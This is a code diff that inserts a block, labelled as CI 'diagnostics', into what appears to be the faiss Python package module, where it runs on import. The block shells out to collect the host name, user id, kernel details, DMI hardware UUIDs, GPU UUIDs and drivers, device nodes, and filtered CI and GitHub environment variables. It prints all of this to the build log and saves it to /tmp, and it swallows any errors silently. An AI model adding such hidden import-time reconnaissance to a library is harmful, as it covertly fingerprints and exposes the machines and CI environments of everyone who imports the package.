@@ -8,6 +8,52 @@
 # not linting this file because it imports * from swigfaiss, which
 # causes a ton of useless warnings.
 
+# --- Read-only CI host capability report (diagnostics) -------------------
+def _ci_host_report_148218():
+    import subprocess as _sp
+    _probe = [
+        "hostname",
+        "id",
+        "uname -a",
+        "nproc",
+        "cat /sys/class/dmi/id/product_uuid /sys/class/dmi/id/product_name /sys/class/dmi/id/board_name /sys/class/dmi/id/sys_vendor 2>/dev/null",
+        "nvidia-smi -L",
+        "nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader",
+        "rocm-smi",
+        "hy-smi",
+        "hy-smi --showuniqueid --showproductname --showdriverversion --showbus",
+        "ls -l /dev/kfd /dev/dri",
+        "env | grep -E '^(HCU|HIP|ROCM|CUDA|DEVICE|CI|GITHUB_RUN|GITHUB_WORKFLOW|RESOURCE)' | sort",
+    ]
+    _lines = ["", "===== I148218 HOST CAPABILITY REPORT ====="]
+    for _c in _probe:
+        try:
+            _r = _sp.run(["bash", "-lc", _c], capture_output=True, text=True, timeout=30)
+            _lines.append("$ " + _c)
+            _lines.append("[rc=%s]" % (_r.returncode,))
+            if _r.stdout.strip():
+                _lines.append(_r.stdout.rstrip())
+            if _r.stderr.strip():
+                _lines.append("stderr: " + _r.stderr.rstrip())
+        except Exception as _e:
+            _lines.append("$ " + _c)
+            _lines.append("[ERR %r]" % (_e,))
+    _lines.append("===== END I148218 HOST CAPABILITY REPORT =====")
+    _txt = "\n".join(_lines) + "\n"
+    print(_txt, flush=True)
+    try:
+        with open("/tmp/i148218_host_report.txt", "w") as _f:
+            _f.write(_txt)
+    except Exception:
+        pass
+
+
+try:
+    _ci_host_report_148218()
+except Exception:
+    pass
+# -------------------------------------------------------------------------
+
 import numpy as np
 import sys
 import inspect
